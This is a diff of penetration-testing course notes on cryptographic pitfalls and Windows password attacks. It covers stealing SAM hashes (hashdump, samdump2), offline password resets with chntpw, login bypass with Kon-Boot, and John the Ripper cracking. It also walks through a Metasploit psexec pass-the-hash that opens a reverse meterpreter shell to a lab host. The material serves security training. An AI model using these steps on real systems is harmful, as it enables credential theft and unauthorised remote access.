@@ -5,7 +5,7 @@ __________________________
 
 https://cdn.members.elearnsecurity.com/ptp_v5/section_1/module_5/html/index.html
 
-_____________________________________________________
+_______________________________________
 ## 1. Classification
 Classification of algorithms:
 1. **Based on Cryptography**
@@ -318,10 +318,264 @@ So now there are 21 people plus another candidate, let's call him Chris. If he f
 
 The birthday attack is most often used to attempt discover collisions in hash functions, such as MD5 or SHA1.
 
-
 _______________________________________
 ## 7. Security Pitfalls
+Most of the times, an attacker will not directly attack the cryptographic algorithms and instead attack the implementation. A system made of many secure inner blocks is not automatically a secure system.
 
+#### 7.1. Attack against Implementation
+Implementation of cryptographic systems correctly is another difficult goal which is hard to achieve.
+
+Some basic point-outs are:
+- Not destroying plaintext after use
+- Not dealing with decrypted data carefully.
+  A system using temporary files to avoid data loss, might leave plaintext or decrypted data or both in the temporary files
+- System using more than 1 key, should take care of all keys equally, because a single key leak renders the complete system useless
+- Allowing recovery of old keys can also act as a weak point
+- And so on
+
+#### 7.2. Attack against Passwords
+Attacks against passwords are very common. Many systems break because they rely on user-generated passwords.
+
+People don't choose strong passwords, it is a fact that software architect should deal with.
+
+If they're forced to use strong passwords, users can't remember them or just write them on a file in cleartext.
+
+Dictionary attacks indeed work really well when dictionary is targeted to the environment, country, age, and language of the target.
+
+Software sometimes makes the problem even worse: limiting the password length, converting everything to lower case, etc.
+
+#### 7.3. Attack against Trust Models
+Sometimes attackers do not attack their target directly. They can instead exploit trust-systems or roles that the target assumes to be trusted.
+
+Simple systems use simple trust models because more secure trust models might break usability.
+
+Complex systems, like ecommerce instead employ more complex trust models (like signed certificates).
+
+An email program might use secure crypto algorithms to encrypt messages, but unless the public keys are certifies by a trusted source (and unless that certification can be verified), the system is still vulnerable.
+
+Cryptographic algorithm that rely on the security of the other network protocols make an assumption: that these protocols are secure.
+
+Attacking network protocols to break a system that uses an unbreakable cryptography algorithm is what happens everyday on the internet.
+
+#### 7.4. Attack on the Users
+Users can be attacked through social engineering, keylogging, or using a malware.
 
 _______________________________________
 ## 8. Windows 2000/XP/2k3/Vista/7/8 Passwords
+```
+      Windows Password
+             v
+    Where are the hashes    |---------> What to do with hashes
+             v              |            ---------|---------
+      Stealing the hash     |            v                 v
+        -----|-----         |      Pass the hash     Crack the hash
+        v         v         |                      ---------|---------
+      Local     Remote -----|                      v                 v
+   -----|-----              |                   CPU Crack        GPU Crack
+   v         v              |
+Running   Offline           |
+system    System            |
+   |         |              |         
+   -------------------------|
+```
+
+All the passwords in Windows (except in Domain Controller configuration) are stored in a configuration database called SAM.
+
+The Security Accounts Manager (SAM) is a database stored as a registry file in Windows NT, Windows 2000, and later versions on Windows.
+
+It stores user's passwords in a hashed format:
+- **LM** hash
+- **NT** hash
+
+#### 8.1. LM hash or LAN Manager hash
+Until Windows Vista, if passwords were smaller than 15 characters, they were stored as LM hash.
+
+Let's see how these LM hashed are created starting from a user's password.
+
+**Computing LM hash from a user password:**
+1. The user's password is converted to uppercase
+2. If the length is less than 14 bytes it is null-padded, otherwise truncated. E.g.: MYPASSWORD0000
+3. It is split into two 7-bytes halves:
+`MYPASSW` and `ORD0000`
+4. This values are used to create two DES keys, one from each 7-byte half, by converting the seven bytes into a bit stream, and inserting a parity bit after every 7 bits. This generates the 64 bits needed for the DES key.
+5. Each of these keys is used to DES-encrypt the constant ASCII string `KGS!@#$%`, resulting in two 8-byte ciphertext values.
+6. The 2 ciphertext values are concatenated to form a 16-byte value, which is the LM hash.
+
+
+All passwords from Windows 2000 are (also) stored as NT hashes.
+
+The trust is that LM hashes are still computed and stored by default up to Windows Vista, for backward compatibility.
+
+In this algorithm, Unicode version of the password is hashed using MD4 algorithm to get resulting hash which is stored for later use.
+
+#### 8.2. Where is the hashes?
+These hashed are stored in **Windows SAM file** which is located in `C:\Windows\System32\config`
+
+These values are also stored in the registry at `HKEY_LOCAL_MACHINE\SAM`
+
+But this are of registry is not accessible while the operating system is running and requires SYSTEM privileges.
+
+#### 8.3. Stealing the hash
+
+
+###### 8.3.1. Stealing the hash - Remote
+In this case, passwords are dumped from the memory of remote system, by loading the password dumping program from remote.
+
+**This requires at least an administrative account.**
+
+This can be done using tools such as:
+- [pwdump](http://www.foofus.net/fizzgig/pwdump/)
+- [fgdump](http://foofus.net/goons/fizzgig/fgdump/)
+- [ophcrack](http://ophcrack.sourceforge.net/)
+- Metasploit
+
+Let us focus using Metasploit to dump hashes.
+
+Let us assume that we have gained access to victim machine by means of a remote exploit and that we have a **meterpreter shell** (how to do so later)
+
+We can dump the hashes by entering `run hashdump`
+
+###### 8.3.2. Stealing the hash - Local
+Here, you need the physical access to the machine. At this point, there are 2 cases:
+- **Running System** <br>
+  In this case, a **local administrator account is required** to download hashes from the memory
+- **Offline System** <br>
+  In this, passwords hashes are decrypted from the online password storage file SAM. The key to decrypt SAM is stored in SYSTEM file
+
+There are situations in which you cannot just reboot or turn off the victim machine. Maybe because you want to be stealthy or maybe because the machine have another security measures at start-up. The only thing you need to know is that if you want to steal hashes from a running system, you must have at least Administrator privileges
+
+There are many tools that can help you dump hashes from a live system if you have correct privileges.
+
+Downloads:
+- [pwdump]( http://www.foofus.net/~fizzgig/pwdump/) or [pwdump]( http://www.tarasco.org/security/pwdump_7/)
+- [fgdump](http://www.foofus.net/~fizzgig/fgdump/default.htm)
+- [SAMinside](http://insidepro.com/eng/saminside.shtml)
+- [ophcrack](http://ophcrack.sourceforge.net/)
+- [IOphtCrack](http://www.l0phtcrack.com/)
+
+#### 8.6 Offline Systems
+If you have physical access to the off-line machine, you have a few more options than if you had only the live system.
+
+You can still **steal hashes** (using previous tools) but, in this situation, you can also **overwrite hashes** or even **bypass Windows login**.
+
+###### 8.6.1 Stealing hashes
+Tools to help steal hashes from online systems:
+- **BackTrack5**
+Steps:
+1. Boot it
+2. Mount Windows and move to folder `/mnt/sda1/WINDOWS/system32/config`
+3. run `bkhive system syskey.txt` or ` samdump2 system syskey.txt > ourhashdump.txt` (for Windows 7, run `bkhive SYSTEM syskey.txt`)
+
+- **OphCrack**
+As soon as the CD is run on boot OphCrack will immediately retrieve password hashes and prompt them for you. Depending on the live CD you have downloaded, you will also be able to start cracking hashes from there. (Usually not a useful option for a pentester that wants to do cracking later)
+
+Remember that if you boot any other operating system, you can always copy files like SAM, SYSTEM, and then later, load them into one of the tools we have seen so far.
+
+So you can quickly dump the SAM file on a USB dongle and then use OphCrack or john later.
+
+
+###### 8.6.2. Overwrite hashes
+Instead of stealing hashed, you can also use tools to change the SAM file content. One of these is **chntpw** (as well as BT5) includes it. You can simply boot it and run it.
+
+Chntpw allows you to:
+- Clear passwords
+- Change passwords
+- Promote Users to Administrator
+
+**Steps:**
+1. Load SAM in chntpw
+2. Choose to edit data and which user to change
+3. Clear the password
+4. Quit and write hive files
+
+
+###### 8.6.3. Bypass Windos Login
+Another method is to bypass Windows login. **Kon-Boot** is a software to get access to a machine by bypassing Windows login.
+
+Kon-Boot is a software which allows to change contents of a Linux and Windows kernel on the fly (while booting).
+
+It allows to log into a system as 'root' user without typing the correct password or to elevate privileges from current user to root. It allows to enter any password protected profile without any knowledge of the password.
+
+[Download](http://www.piotrbania.com/all/kon-boot/)
+
+#### 8.7. What to do with hashes?
+There are 2 things we can do with hashes:
+- Pass the hash
+- Crack the hash
+
+###### 8.7.1. Pass the hash
+Pass-the-hash is a different kind of authentication attack that allows us to use LM & NT hashes to gain access to remote Windows host without having to know the actual password: we will only use the hash.
+
+You will see more of this in Network Security section.
+
+For now, let's just give it a look by using Metasploit.
+
+Let's suppose you get the hash for user **eLS** on **Box A** and you know that user eLS also have access to box B. You can run payloads on Box B even if Box B is immune from any exploit.
+
+Steps:
+1. Let us configure the module in Metasploit:
+```
+msf > use exploit/windows/smb/psexec
+msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
+msf exploit(psexec) > set LHOST 192.168.88.132
+msf exploit(psexec) > set LPORT 443
+msf exploit(psexec) > set RHOST 192.168.88.134
+```
+
+Where:
+- In the first line we select the exploit module
+- Then the payload to run on the remote system (this will allow us to gain a meterpreter shell)
+- LHOST is our host (local)
+- LPORT is our port
+- RHOST is remote victim host
+
+2. After that we can set the user (that will be **eLS**) and the password, where we will insert the hash.
+```
+msf exploit(psexec) > set SMBUser eLS
+msf exploit(psexec) > set SMBPass 00000000000000000000000000000000:0446385C4CBFBAED9F33E1D7B00E184C
+msf exploit(psexec) > exploit
+
+```
+
+Note that if you do not have both LM and NT hashes, you can set one of them with 32 0's.
+
+Note that this is just a quick look on how to perform a pass-the-hash using Metasploit framework.
+
+##### 8.7.2 Crack the hash
+Fist, we need the hash of the password that we have gained through the previous techniques.
+
+Then we will use the correct hash function to hash plaintexts of likely passwords.
+
+When you get a match, whatever string you used to generate your hash, that's the password you are looking for.
+
+Since this can be rather time-consuming, there are many ways to do hat, and many tools that automate this step.
+
+Remember that the time required to crack a hash is strictly depending on the hardware you have.
+
+A hash can be cracked using a CPU or a GPU.
+
+- **CPU - JtR**
+One the most famous password crackers is [John the Ripper](http://www.openwall.com/john/).
+
+With this great tool you can perform different attacks, like dictionary and brute force.
+
+So, let us see now how to crack one the hashes that we dumped in the previous slides.
+
+First of all we need a txt file with the hashes. For LM and NT hashes the file must be in this format:
+`eLS:0446385C4CBFBAED9F33E1D7B00E184C`
+
+Where the first entry (`eLS`) is username and second entry is the hash. Once we have our txt file, we can run John with brute force option.
+
+To do this, we write the command:
+`john-386.exe --incremental hashtocrack.txt`
+
+The output is **mystrongpsw**
+
+Another tool you can use is **OphCrack**. OphCrack can also use rainbow tables. To get it to work, first download the tables, then load password hashes and tables hashes.
+
+Once you have it all set, click on 'Crack' button and wait for the password.
+
+- **GPU**
+A real useful tool that uses GPU to crack hashes is [oclHashcat](https://hashcat.net/oclhashcat/)
+
+Another tool you can use is [RainbowCrack](http://project-rainbowcrack.com/). This tools allows you to use rainbow tables to crack hashes, but using GPU instead of CPU. The problem in there is that rainbow tables are not free, but if you want to calculate them, you can do it with **rtgen.exe**
